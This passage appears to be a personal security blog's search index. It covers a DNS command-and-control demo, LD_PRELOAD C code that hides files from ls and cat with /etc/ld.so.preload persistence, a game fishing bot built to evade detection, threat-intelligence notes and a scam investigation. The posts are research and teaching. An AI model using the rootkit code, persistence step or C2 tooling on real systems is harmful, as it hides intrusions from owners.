Demo Repository - The repository is created for a starting point to improve/build upon.\nThe repository contains both the agent and the server. When the server is being ran it sets the default handler dns.HandleFunc(\u0026quot;.\u0026quot;, AgentHandler) to handle any pattern for domain question this is for convenience, in some other cases you will want to specify some special handles.\nUsage  Start the server  $ go run main.go 127.0.0.1:8053 Start the agent  $ go run ./agent/main.go Execute commands on the server side shell (In the case below simple dir). Note that I type cmd /C dir - Why?   \u0026gt;\u0026lt;((((\u0026gt; dns c2 by syl \u0026lt;))))\u0026gt;\u0026lt; dnsc2\u0026gt; cmd /C dir Volume in drive C is OS Volume Serial Number is XXXX-XXXX Directory of C:\\code\\dnsc2\\agent 10/28/2022 08:40 PM \u0026lt;DIR\u0026gt; . 10/29/2022 11:03 PM \u0026lt;DIR\u0026gt; .. 10/28/2022 08:40 PM 481 go.mod 10/28/2022 08:40 PM 3,755 go.sum 10/30/2022 12:37 PM 1,762 main.go 3 File(s) 5,998 bytes 2 Dir(s) 107,561,959,424 bytes free Conclusion Please note that there could be some easier ways to do this, and some information can be wrong I did my best to research everything that I post here, if you find an error or if you think that something can be improved somewhere you can drop me a message!\nResources  https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat  https://stackoverflow.com/a/28918017  https://www.cloudflare.com/learning/dns/what-is-dns/  https://resources.infosecinstitute.com/topic/bypassing-security-products-via-dns-data-exfiltration/   ", 
        "url": "https:\/\/sy1.sh\/posts\/2022-10-26-dns-c2-communcation\/"
    },
    
    "https:\/\/sy1.sh\/tags\/dynamic-linker\/": {
        "title": "Dynamic Linker",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/dynamic-linker\/"
    },
    
    "https:\/\/sy1.sh\/posts\/2022-10-04-dynamic-linker-hijacking-experiments-2\/": {
        "title": "Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)",
        "tags": ["C","Dynamic Linker","LD_PRELOAD",],
        "content": "Journey Post This post is a something that I call \u0026ldquo;journey post\u0026rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like \u0026lt;journey\u0026gt; so that you can skip it if you are in a hurry.\n Overview In the last post I\u0026rsquo;ve described how I hid a file from all the sys calls that are using readdir. In this post I will try to hide it from the cat command. Let\u0026rsquo;s first examine/reverse engineer how the cat command works internally.\nNaturally I would start with a simple strace which will trace the system calls and signals that the command uses.\n$ which cat /usr/bin/cat $ strace /usr/bin/cat syl.lys execve(\u0026#34;/usr/bin/cat\u0026#34;, [\u0026#34;/usr/bin/cat\u0026#34;, \u0026#34;syl.lys\u0026#34;], 0x7ffca9c17508 /* 68 vars */) = 0 ... access(\u0026#34;/etc/ld.so.preload\u0026#34;, R_OK) = -1 ENOENT (No such file or directory) // WINK WINK, not yet ... openat(AT_FDCWD, \u0026#34;syl.lys\u0026#34;, O_RDONLY) = 3 The most interesting sys call in the output is openat so lets see the source code of openat.c . Here we can see the char const *file that variable is what holds our filename (look at the strace output). After that, I followed our steps in the last post by implementing a function with the same signature and wrapping the original one.\n\u0026lt;journey\u0026gt;\nAfter a few tries I was quick to realize that there is some issue. The wrapper that I\u0026rsquo;ve implemented didn\u0026rsquo;t work, or at least didn\u0026rsquo;t work all the time. I\u0026rsquo;ve tested it out with a simple program that would just call it and in there it worked, I didn\u0026rsquo;t quite get why it does what it does but I found the following discussions:\n intercepting the openat() system call for GNU tar  How to find out what functions to intercept with LD_PRELOAD?   As it turns out (my best guess) the sys call that I am trying to override openat is probably not the one that the cat uses. I decided to look at the source code for [cat.c][https://github.com/coreutils/coreutils/blob/master/src/cat.c] and search for everything that has *open* in it.\nI found on line 686 a call to the open. An important note here is that this open call here is not the sys call but the call in the std lib which will call the related system call for us. So I\u0026rsquo;ve decided to change my approach and override the open function instead.\n\u0026lt;/journey\u0026gt;\nHow does the open function work? I wouldn\u0026rsquo;t try to explain something that I am hardly good at so it is best for you to read the man pages for that one.\nLet\u0026rsquo;s start by copying the signature of the open function and wrap it.\nstatic int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } In this code block I\u0026rsquo;ve wrapped the original open function with our implementation of the open function. What is left now is to add our \u0026ldquo;malicious\u0026rdquo; part to it.\nif (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; // Setting up the error to be ERROR NO ENTRY(ENOENT)  return -1; // Returning -1 (failure) } And lastly all together\nintercept_open.c #define _GNU_SOURCE  #include \u0026lt;fcntl.h\u0026gt;#include \u0026lt;dlfcn.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;errno.h\u0026gt; #define MALICIOUS_FILE \u0026#34;syl.lys\u0026#34;  static int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } Let\u0026rsquo;s see if its working\u0026hellip;\n$ ls intercept_open.so syl.lys $ LD_PRELOAD=./intercept_open.so cat syl.lys cat: syl.lys: No such file or directory As you can see the cat command returns No such file or directory which is exactly what we are aiming for.\nCombining it with our readdir We created a malicious open function that wraps the original one from the standard lib, lets now combine it with the readdir from the previous post into a single shared object.\nmalicious.c #define _GNU_SOURCE  #include \u0026lt;fcntl.h\u0026gt;#include \u0026lt;dlfcn.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;errno.h\u0026gt;#include \u0026lt;dirent.h\u0026gt; #define MALICIOUS_FILE \u0026#34;syl.lys\u0026#34;  static int (*original_open)(const char *filename, int flags, ...) = NULL; struct dirent *(*original_readdir)(DIR *dirp) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } struct dirent *readdir(DIR *dirp) { struct dirent *ret; original_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); while((ret = original_readdir(dirp))) { if(strstr(ret-\u0026gt;d_name, MALICIOUS_FILE) == 0) break; } return ret; } Let\u0026rsquo;s test it out, supposedly we shouldn\u0026rsquo;t get entries from ls and cat.\n$ touch syl.lys $ ls intercept_open.c malicious.c malicious.so syl.lys $ export LD_PRELOAD=./malicious.so $ ls intercept_open.c malicious.c malicious.so README.md $ cat syl.lys cat: syl.lys: No such file or directory End With that I am concluding this post, again if you reached here thank you so much it means a lot! In the next part I will get deeper and make our malicious file to be running and beaconing a malicious C2 server, we will look through some C2 communication examples using the DNS protocol so that we can remain under the radar(or the firewall ^^).\nFull Source Code Resources This post wouldn\u0026rsquo;t be possible without:\n https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html  https://linux.die.net/man/2/openat  And some kind StackOverflow users!  ", 
        "url": "https:\/\/sy1.sh\/posts\/2022-10-04-dynamic-linker-hijacking-experiments-2\/"
    },
    
    "https:\/\/sy1.sh\/tags\/ld_preload\/": {
        "title": "LD_PRELOAD",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/ld_preload\/"
    },
    
    "https:\/\/sy1.sh\/posts\/2022-10-02-dynamic-linker-hijacking-experiments\/": {
        "title": "Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)",
        "tags": ["C","Dynamic Linker","LD_PRELOAD",],
        "content": "Overview Recently I heard about a new malware called Symbiote , which the researches are calling the \u0026ldquo;Nearly-Impossible-to-Detect Linux Threat\u0026rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I\u0026rsquo;ve started to research it.\nI highly advise you to read through these articles first before we begin with the actual post:\n Hijack Execution Flow: Dynamic Linker Hijacking  What Is the LD_PRELOAD?  What is a Shared Library?   Implementation I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I\u0026rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.\nWhat do we need first and how to hide a file from lets say a command like ls? With a little bit of investigating of how the ls works internally through the source code and the linux manual page We can see that internally we have a function that is called print_dir. I\u0026rsquo;ve truncated the comments of the original source code.\n... static void print_dir (char const *name, char const *realname, bool command_line_arg) ... If we continue further down the function we can see the loop that actually iterates over the files\n... while (true) { errno = 0; next = readdir (dirp); // Here we can see that the loop iterates over readdir as long  // as the pointer that readdir returns isn\u0026#39;t null and the errno != 0  if (next) { if (! file_ignored (next-\u0026gt;d_name)) // we can see here that it the filename is  // taken from the next variable, lets look through the source code of `readdir`  { ... Let\u0026rsquo;s confirm that by invoking nm this will show us the dynamic symbols that are being loaded from shared libs.\n$ nm -D /usr/bin/ls | grep \u0026#34;readdir\u0026#34; U readdir@GLIBC_2.2.5 Now I concluded that I need to search into the source code of readdir which is located here and the linux manual page . The description more or less describes exactly what we concluded from the source code of ls.c. Lets see where we set that d_name variable.\n#include \u0026lt;dirent.h\u0026gt; struct dirent *readdir(DIR *dirp); // Signature of the readdir struct dirent { ino_t d_ino; /* Inode number */ off_t d_off; /* Not an offset; see below */ unsigned short d_reclen; /* Length of this record */ unsigned char d_type; /* Type of file; not supported by all filesystem types */ char d_name[256]; /* Null-terminated filename */ };  ⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the dirent structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that d_name will exists since this field must be implemented on all POSIX systems.\n Alright, let\u0026rsquo;s start implementing our own function readdir that we will wrap the original one with.\nintercept_readdir.c #define _GNU_SOURCE #include \u0026lt;dirent.h\u0026gt; // Including the Directory Entry structure// The dynamic linking header file so we can use the dlsym // which will give us the address for the readdir symbol #include \u0026lt;dlfcn.h\u0026gt;#include \u0026lt;string.h\u0026gt; // So we can use the strstr struct dirent *readdir(DIR *dirp) { struct *(handle)(DIR *); // https://man7.org/linux/man-pages/man3/dlsym.3.html  // Search for RTLD_NEXT, basically it allow us to wrap  // the original function  handle = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;) struct dirent *dp; // Iterating over the return values of our original `readdir`  while((dp = handle(dirp))) { // if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-\u0026gt;d_name`)  // break the loop and go to the next entry, essentially skipping our file.  if(strstr(dp-\u0026gt;d_name, \u0026#34;syl.lys\u0026#34;) == 0) break; } return dp; } This is what our final version of wrapper for readdir would look like. Now let\u0026rsquo;s try to compile it.\n$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl Flags:\n fPIC  -shared creates a shared object -D_GNU_SOURCE flag / _GNU_SOURCE - TLDR: We need it for RTLD_NEXT -ldl   Now that we have shared object (*.so) file lets see how to use it in action.\nHow to overwrite the exported symbols? LD_PRELOAD  What is LD_PRELOAD?   I advise you to read that first to get a better understanding of how it works.\nThe next thing that we are going to do is to test our shared library and see if it works. Lets run ls with our libhidemyfile.so loaded before anything else.\n$ ls libhidemyfile.so syl.lys $ LD_PRELOAD=./libhidemyfile.so ls libhidemyfile.so As you can see we successfully implement a shared library that hides our file from ls, and not only that command, every command that uses readdir won\u0026rsquo;t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing LD_PRELOAD in front of every command.\n/etc/ld.so.preload If you read carefully the man pages for LD_PRELOAD you should know that you won\u0026rsquo;t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.\nInstead we are going to use the /etc/ld.so.preload which does not suffer from these restrictions. This suffers from requiring root privileges but c\u0026rsquo;mon.. if you are here you will get those!\nWe first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.\n$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so Then we just need to place our library dir in ld.so.preload file.\n$ sudo echo \u0026#34;/lib/libhidemyfile.so\u0026#34; \u0026gt; /etc/ld.so.preload And if everything is good, executing ls or any of its aliases will hide our file from the output. Let\u0026rsquo;s verify this by using ldd\n$ ldd /bin/ls linux-vdso.so.1 (0x00007ffc0c8e2000) /lib/libhidemyfile.so (0x00007f00e59e4000) \u0026lt;--- Here it is! libselinux.so.1 =\u0026gt; /lib64/libselinux.so.1 (0x00007f00e5997000) libcap.so.2 =\u0026gt; /lib64/libcap.so.2 (0x00007f00e598d000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007f00e5600000) libpcre2-8.so.0 =\u0026gt; /lib64/libpcre2-8.so.0 (0x00007f00e58f0000) /lib64/ld-linux-x86-64.so.2 (0x00007f00e5a0f000) For your convenience I\u0026rsquo;ve setup a Docker container that you can use with ld.so.preload setup\n$ docker run -it --rm sylly/ctf_findme End If you reached here, thank you so much for the read. In the next part I will try to \u0026ldquo;completely\u0026rdquo; hide it from the system because now if we cat it despite not \u0026ldquo;reading\u0026rdquo; it in the directory would print us the contents of the file, but that will be the subject of the next post.\nFull Source Code Resources This post wouldn\u0026rsquo;t be possible without:\n https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/  https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf  https://attack.mitre.org/techniques/T1574/006/  https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/  https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/  https://blog.jessfraz.com/post/ld_preload/   ", 
        "url": "https:\/\/sy1.sh\/posts\/2022-10-02-dynamic-linker-hijacking-experiments\/"
    },
    
    "https:\/\/sy1.sh\/posts\/2022-05-23-create-plugin-architecture-with-python\/": {
        "title": "Create Plugin Architecture With Python",
        "tags": ["python",],
        "content": "There are some use-cases where a plugin architecture is needed, I call this \u0026ldquo;code\u0026rdquo; plugins but it is quite possible that there is already a word for that. The idea is to \u0026lsquo;load\u0026rsquo; functions or classes that are dynamically created so that you can have the reference to the instances at runtime. I\u0026rsquo;ve created 2 solutions for that matter one that is using the __subclasses__ dunder method and one using a decorator.\nSolution 1 Repository: https://github.com/syrull/plugin-arch-python/tree/main/Solution-1 SOLUTION-1 │ configuration.py │ main.py │ README.md │ setup.py │ └───actions action_example1.py action_example2.py __init__.py Loading the __subclasses__ of the BaseAction class and creating a \u0026lsquo;pluggable\u0026rsquo; classes. The actions can be specified in the configuration.py file in the ACTIONS const. This method is inspired by django\u0026rsquo;s INSTALLED_APPS method.\nThe call method is a placeholder for the \u0026ldquo;actions\u0026rdquo;.\nTo Register an action  New python file in actions/ folder Create a class with an appropriate name (ex. ClickAction) Extend the class with BaseAction Add an entry to ACTIONS const located in configuration.py file with the approriate path to the module  After that the function will be available at the register in the main.py file.\n$ python main.py [\u0026lt;class \u0026#39;actions.action_example1.Example1Action\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;actions.action_example2.Example2Action\u0026#39;\u0026gt;] Benchmarks Measure-Command { python .\\main.py } Days : 0 Hours : 0 Minutes : 0 Seconds : 0 Milliseconds : 24 Ticks : 240745 TotalDays : 2.78640046296296E-07 TotalHours : 6.68736111111111E-06 TotalMinutes : 0.000401241666666667 TotalSeconds : 0.0240745 TotalMilliseconds : 24.0745 Solution 2 Repository: https://github.com/syrull/plugin-arch-python/tree/main/Solution-2 SOLUTION-2 │ main.py │ README.md │ register.py │ └───actions action_example1.py action_example2.py __init__.py The benefits of this solution are that we have a control over the decorator and we can pass some custom *args, **kwargs to the decorated functions.\nTo Register an action  New python file in actions/ folder Create function with an appropriate name (ex. action_onclick) Decorate the function with register_action decorator Export the function in the __all__ method in actions/__init__.py file  After that the function will be available at the register in the main.py file.\n$ python main.py [\u0026lt;function action_example1 at 0x000001CC3F88D310\u0026gt;, \u0026lt;function action_example2 at 0x000001CC3F88D3A0\u0026gt;] Benchmarks Measure-Command { python .\\main.py } Days : 0 Hours : 0 Minutes : 0 Seconds : 0 Milliseconds : 22 Ticks : 227803 TotalDays : 2.6366087962963E-07 TotalHours : 6.32786111111111E-06 TotalMinutes : 0.000379671666666667 TotalSeconds : 0.0227803 TotalMilliseconds : 22.7803 ", 
        "url": "https:\/\/sy1.sh\/posts\/2022-05-23-create-plugin-architecture-with-python\/"
    },
    
    "https:\/\/sy1.sh\/tags\/python\/": {
        "title": "python",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/python\/"
    },
    
    "https:\/\/sy1.sh\/tags\/game-bot\/": {
        "title": "Game Bot",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/game-bot\/"
    },
    
    "https:\/\/sy1.sh\/posts\/2022-05-22-simple-fishing-bot\/": {
        "title": "Simple Fishing Bot for World of Warcraft",
        "tags": ["World of Warcraft","Game Bot","Windows API","python",],
        "content": "This fishing bot consists only of about 50 lines of code, it incorporates the mechanics of World of Warcraft and some simple Windows API Calls.\nRepository: https://github.com/syrull/simple-fishing-bot Overview The bot has about ~99% success rate, there are some extremely rare cases where the bot won\u0026rsquo;t catch it and I will explain why later. The method that the bot is using, should work in almost any fishing scenario in the game, I would personally avoid crowded places. The testing has been done in the current expansion (Shadowlands).\nThe bot is running on the currently Active Window, I haven\u0026rsquo;t performed checks wether this is the window of the game or not. It waits for about 2 seconds before it starts.\nMetrics Zereth Mortis: 29m 33s Items Looted: 161 That means that we loot roughly about ~5.4 fish per minute.\nInstallation \u0026amp; Usage Check the requirements.txt, for the Python Requirements and install them via pip install -r requirements.txt. The tests are done under Python3.10 however I believe everything should work with Python\u0026gt;=3.6.\nSet the bait Before using the bot, you need to supply it with an image of the bait. The image has to be on the bottom parts of the bait. Here is an example image, the green area indicates what would be a good image of the bait, it needs to be as small as possible.\nSave the image and place it at the root of the script as bait.png, additionally you can adjust the variable BAIT_IMAGE in the `fishingbot.py.\n ⚠️ It is important for you to take the photo because of the graphical/display settings which can be different for each computer.\n Fine-tune the script The fine tunning that you have to do consists of:\nFISHING_BUTTON = \u0026#34;b\u0026#34; TUNE_BAIT_MOUSE_UNDER_PX = 35 EDGE_RESET = 10, 10 ACTIVE_AFTER = 2 CONFIDENCE = 0.7    Variable Description     FISHING_BUTTON The button that you use for fishing, in my case it was b   TUNE_BAIT_MOUSE_UNDER_PX The offset pixels where the mouse is going to be whenever there is a bait, see the How it works? section   EDGE_RESET Those are the x, y coordinates to reset the mouse after catching the fish, it is used to improve the success rate, leave it at 10, 10   ACTIVE_AFTER The bot simply waits 2 secs before it starts   CONFIDENCE The confidence of the template matching    How it works? The method is extremely simple, it utilizes two things. The first one is the Template Matching , this is what pyautogui.locateOnScreen uses under the hood and the second one is the PyGetCursorInfo function which is exposed by the win32gui lib.\nThe solution lies in the gif from the beginning, whenever the bobber actually catches a fish the AoE (Area of Effect) for the bobber becomes bigger allowing us to detect a change on the cursor, then we use the GetCursorInfo to catch the change of the cursor and if it becomes a different tuple from the default one which we set when there is nothing active on our cursor. Then we execute the click.\nNow about the fine-tuning, look at this example\nThe TUNE_BAIT_MOUSE_UNDER_PX variable which doesn\u0026rsquo;t have the best name ever is indicated with red, in simple terms it is how many pixels under the located bobber to place the mouse. For myself the range between 28-32 works the best, but as I said earlier this could differ.\nEdge cases There is a rare edge case when the default tuple for the cursor doesn\u0026rsquo;t change which happens if the script isn\u0026rsquo;t tune right, I\u0026rsquo;ve solved this by resetting the cursor at x=10, y=10 position of the screen and then bringing it back. In a case when the cursor\u0026rsquo;s icon doesn\u0026rsquo;t change and if it sits with the bait icon the bot would just wait the duration of the fishing and reset itself.\nAdditional features I\u0026rsquo;ve added a bit of randomness in the timings between each press of the fishing and the click of the bobber with additionally pressing space every now and then. Apparently the server can detect that something fishy is going on when this randomness is removed.\n", 
        "url": "https:\/\/sy1.sh\/posts\/2022-05-22-simple-fishing-bot\/"
    },
    
    "https:\/\/sy1.sh\/tags\/windows-api\/": {
        "title": "Windows API",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/windows-api\/"
    },
    
    "https:\/\/sy1.sh\/tags\/world-of-warcraft\/": {
        "title": "World of Warcraft",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/world-of-warcraft\/"
    },
    
    "https:\/\/sy1.sh\/tags\/stix\/": {
        "title": "STIX",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/stix\/"
    },
    
    "https:\/\/sy1.sh\/posts\/2022-04-10-stix-taxii-complete-knowledge\/": {
        "title": "STIX\/TAXII - Complete Knowledge",
        "tags": ["STIX","TAXII","Threat Intelligence","python",],
        "content": "Introduction STIX What is STIX and what is TAXII? In the most simple terms STIX is a model of Threat Intelligence that is represented in motivations, abilities, capabilities and response objects. Those objects are then represented in either JSON (STIX 2) or XML (STIX 1).\nHere is a very simple representation of STIX Objects in a graph. Explanation of the example The data can be helpful for preventing or mitigating various kinds of attacks that can be expressed with STIX. All the list of the examples you can find in their official example page .\nTAXII The STIX data has to be relayed in some way, that\u0026rsquo;s why we have the TAXII Server. It is a simple web server specifically created for storing and sharing that kind of data.\nTAXII 1.x Structure The TAXII 1.2 Server has the following structure:\n Discovery Service - Within a POST request to their discovery URL (which should be pointed by the Server maintainers). Collection Management URL - The service that has the collections with STIX objects. Channels - Push/Subscribe pattern.  The full list of features for TAXII1 can be found in their official documentation:\n https://docs.oasis-open.org/cti/taxii/v1.1.1/taxii-v1.1.1-part3-http.html  https://taxiiproject.github.io/releases/1.1/TAXII_Overview.pdf  https://www.oasis-open.org/committees/download.php/57324/OASIS   TAXII 2.x Structure For the newer versions of the TAXII Server we have the following structure:\n /discovery - Discovers the paths to the different services provided by the Server. api_roots - Provides the API URLs for the different types of Collection Management.  collections - Provides the available collections for the given api_root.  collection/objects - Provides a list of STIX Objects in a given collection      You can see that this is very similar to the TAXII 1.x servers, there isn\u0026rsquo;t much of a difference in the structure besides that the collection_management_url is api_root in TAXII 2.x.\nThe full list of features for TAXII2 can be found in their official documentation .\nTAXII Servers and Threat Intelligence Providers The information about this is very scarce so I\u0026rsquo;ve gathered a quick list of the known providers for STIX data.\n   Resource URL Description Data Type     AlienVault OTX https://otx.alienvault.com/api  Requires an account, provides data in various ways including a TAXII Server. STIX 1.x   Threat Connect https://threatconnect.com/stix-taxii/  Requires an account, Paid service, (consumes and provides) threat intel. STIX 1.x/2.x   EcleticIQ https://www.taxiistand.com/  Test TAXII (v1x) server. (quite unstable and inconsistent) STIX 1.x   Limo - Anomali https://www.anomali.com/resources/limo  Test TAXII (v1x/v2x) server. Somewhat unstable but mostly fine during tests. STIX 1.x/2.x    Tools for STIX/TAXII The main tool for creating/parsing or generating STIX data is going to be Python, since that all of the tools created are written in Python. Of course there are other alternatives but currently that\u0026rsquo;s the most common one.\nOther tools that might come in handy.\n   Tool Description Version     stix-shifter  Translates STIX to various other Threat Intelligence formats such as Carbon Black Cloud Query and others STIX 1.x/2.x   stix2  The main python package to parse and use/create STIX2 data. STIX 2.x   stix2-validator  Provides a validation for the STIX2 data, can be used to validate your data from your sources. STIX 2.x   stix2-slider  Transforms STIX2 content to STIX1.2 STIX 2.x   stix2-elevator  Transforms STIX1 data to STIX2.x STIX 1.x   stix  The main python package for STIX1 data. STIX 1.x   stix-validator  Validating STIX1 data. STIX 1.x   stix2-patterns  Validator and Pattern Parser for STIX 2.x Patterns STIX 2.x   taxii2-client  Python Client for TAXII 2 Servers TAXII 2.x   cabby  Python Client for TAXII 1 Servers TAXII 1.x    Snippets and Gists  https://gist.github.com/syrull/6a2614560fb0474df166a51bcb34990d (Creating a TAXII2 Client for LimoAnomali) https://gist.github.com/syrull/73b1798f90c4109a13ef9fceb1f2f858 (Creating a TAXII1 Client for OTXAlienVault)  ", 
        "url": "https:\/\/sy1.sh\/posts\/2022-04-10-stix-taxii-complete-knowledge\/"
    },
    
    "https:\/\/sy1.sh\/tags\/taxii\/": {
        "title": "TAXII",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/taxii\/"
    },
    
    "https:\/\/sy1.sh\/tags\/threat-intelligence\/": {
        "title": "Threat Intelligence",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/threat-intelligence\/"
    },
    
    "https:\/\/sy1.sh\/posts\/2021-05-27-installing-private-packages-in-docker-image-notes\/": {
        "title": "Installing Private Packages in Docker Image - Notes",
        "tags": ["python","docker","ssh forwarding","ssh",],
        "content": "Quick notes about how to forward an ssh agent and other tricks regarding the installation of python packages.\nUsing SSH Forwarding Exporting the $SSH_AUTH_SOCK environment variable in the image.\n$ docker run -rm -t -i -v $(dirname $SSH_AUTH_SOCK) -e SSH_AUTH_SOCK=$SSH_AUTH_SOCK ubuntu /bin/bash Or in the environment section of a compose file.\nenvironment: SSH_AUTH_SOCK: $SSH_AUTH_SOCK Eventual Issues with that  Installing ssh in the container Adding entries to /etc/ssh/ssh_known_hosts  Caveats  Traces of ssh keys inside the image  References  https://gist.github.com/d11wtq/8699521  https://vsupalov.com/build-docker-image-clone-private-repo-ssh-key/  https://medium.com/@bmihelac/examples-for-building-docker-images-with-private-python-packages-6314440e257c   ", 
        "url": "https:\/\/sy1.sh\/posts\/2021-05-27-installing-private-packages-in-docker-image-notes\/"
    },
    
    "https:\/\/sy1.sh\/tags\/ssh\/": {
        "title": "ssh",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/ssh\/"
    },
    
    "https:\/\/sy1.sh\/tags\/ssh-forwarding\/": {
        "title": "ssh forwarding",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/ssh-forwarding\/"
    },
    
    "https:\/\/sy1.sh\/about\/": {
        "title": "",
        "tags": [],
        "content": "About I am a offensive security consultant, researcher at CloudLinux and CTF player with ADMinions . Sometimes I like to annoy myself with DotA2 or Counter-Strike.\nIf you want to contact me:\n Discord: syl5x LinkedIn  Email: dganev[ат]pm.me  ", 
        "url": "https:\/\/sy1.sh\/about\/"
    },
    
    "https:\/\/sy1.sh\/posts\/2024-19-12-investigation-on-scams\/": {
        "title": "",
        "tags": [],
        "content": "[[25-11-2024 They Tried To Scam Me Notes]]\nThis is rather an unusual article that I would be publishing. I usually don\u0026rsquo;t do threat hunting or any amount of hunting outside work, but this one got personal.\n This is probably a good place to state that this is not related to my work activities and that I am doing this of my own accord!\n Let\u0026rsquo;s start from the beginning. A little while ago, I was contacted by a person in a marketplace for an item that I was selling. The first rather odd thing was that he contacted me on Viber. You may not know, but Viber is really popular in my country, and people use it for most things, even some government entities use Viber bots to inform people. The person spoke good Bulgarian, and there wasn\u0026rsquo;t anything striking at first. There was no punctuation or dots, so it’s not something that is being generated. Also, the particular words that he was using indicated that he was not a bot. He asked me if the item was available, and we kept the conversation short. He didn\u0026rsquo;t reply immediately; I think he even went to sleep for the rest of the night, but he was right back in the morning. After we exchanged some messages back and forth, he agreed on the price that I had posted and offered to send a courier to pick up the item.\nNow, this is the point where I would usually spot that something was off, but the nature of this item actually required someone to come pick it up, so that offer made sense at the time. I agreed, and the next thing I knew, he was asking me to click on a link and enter my details for the courier. At this point, I knew that someone was trying to scam me, but I wanted to see how they operated before cutting the rope. Their flow was as follows:\n They claim to have made a request on the courier\u0026rsquo;s website and send you a link to a phishing site. They make you believe it is legitimate by sending edited screenshots from the actual website, where their claim is seemingly \u0026ldquo;confirmed\u0026rdquo; by the courier. You enter your details. PROFIT!!  When they sent me the website, it was specific to my item. It had the title of my item and the agreed price. I got even more interested. I went back and checked their profile. It was a legitimate name with a legitimate profile picture (probably taken from Facebook), and they even had a proper phone number within the country. It was a bit sophisticated, and I could see how some people might actually be deceived by the scam.\nI wanted to investigate further. I went back to the messenger and typed in English, asking something along the lines of, \u0026ldquo;How successful is this scam?\u0026rdquo; However, the person responded in very broken language, wished me luck, and then blocked me. The interesting part was that their previously non-bot-like messages suddenly changed, and they started typing like someone who did not speak the language fluently. That was fine, I still had the website (at least for the next couple of hours).\n![[Pasted image 20241126085949.png]]\nIn the screenshot, this is an item I found through a sequential ID. The address appears to be random, and the Viber user matches the one specified on the website, \u0026ldquo;Роселина Сопаджиева.\u0026rdquo; This is a rather specific name, it’s not the usual \u0026ldquo;John Doe,\u0026rdquo; which is interesting!\n Note: During my investigation of that name, I discovered it perfectly matches a generated name from the testing library Faker. I found the combination within their test data: GitHub Link .\n I tried to gather as many indicators as possible, including the HTML of the page, any links to JavaScript files, etc. Afterward, I fuzzed the website for other resources and found a couple more artifacts, which I downloaded to keep as references. The link they sent me was along the lines of track/318418341. I noticed the number looked sequential, so I checked 3-4 numbers above and below it, and it worked. I found pages for other articles listed in the marketplace, so it wasn’t specifically tailored for my item\u0026hellip; pity. Anyway, I wanted to learn more about the domain.\nI quickly scanned it using crt.sh, assetfinder, and a couple more tools, and I discovered one additional subdomain.\nalo.bg-inc63284.pics alo.bg is another marketplace platform in our country. I got curious about what would happen if I created a list of all couriers and marketplaces we have, would they resolve? You bet they would!\nspeedy [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 177ms] olx [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 186ms] bazar [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 196ms] alo [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 201ms] econt [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 253ms] dpd [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 241ms] I found other subdomains that were not set up (blank pages). The only one working was the econt subdomain. I then tried to get the server IP, but the entire setup was protected by Cloudflare, so no luck there. With no other options left, I turned to VirusTotal to see if I could connect the indicators I had gathered (HTML/CSS/JS files) to anything else.\nI uploaded a few samples but initially got nothing, until I uploaded one specific SVG file:\n VirusTotal Link   In the Relations tab, it 